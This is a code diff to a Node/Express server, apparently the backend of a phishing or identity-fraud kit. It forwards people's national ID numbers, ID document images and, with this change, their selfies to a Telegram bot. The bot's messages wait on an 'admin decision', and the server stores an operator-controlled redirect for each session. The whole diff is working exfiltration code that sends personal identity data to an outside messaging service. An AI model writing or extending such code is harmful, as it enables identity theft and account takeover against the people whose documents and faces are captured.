@@ -196,7 +196,7 @@ async function enviarMensajeDoc({ cedula, docType, frenteB64, reversoB64, sessio
 }
 
 // Selfie REST capturada
-async function enviarMensajeRest({ cedula, docType, sessionId }) {
+async function enviarMensajeRest({ cedula, docType, selfieB64, sessionId }) {
   const mensaje = `🔄 SELFIE REST CAPTURADA\n👤 ${docType} ${cedula}\n⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}\n\n⏳ Esperando decisión del admin...`;
   const response = await fetch(getTelegramApiUrl('sendMessage'), {
     method: "POST", headers: { "Content-Type": "application/json" },
@@ -208,6 +208,7 @@ async function enviarMensajeRest({ cedula, docType, sessionId }) {
     sd.last_message_id = data.result.message_id;
     sessions.set(sessionId, sd);
   }
+  if (selfieB64) await enviarFotoTelegram(selfieB64, 'selfie-rest.jpg', '🤳 Selfie REST');
 }
 
 // Validación iniciada
@@ -295,12 +296,12 @@ app.post("/notifydoc", async (req, res) => {
 
 // POST /notifyrest
 app.post("/notifyrest", async (req, res) => {
-  const { session_id, cedula, docType } = req.body;
+  const { session_id, cedula, docType, selfieB64 } = req.body;
   if (session_id) {
     const sd = sessions.get(session_id) || { redirect_to: null };
     sd.redirect_to = null;
     sessions.set(session_id, sd);
-    await enviarMensajeRest({ cedula: cedula || '?', docType: docType || '?', sessionId: session_id });
+    await enviarMensajeRest({ cedula: cedula || '?', docType: docType || '?', selfieB64, sessionId: session_id });
   }
   return res.json({ ok: true });
 });
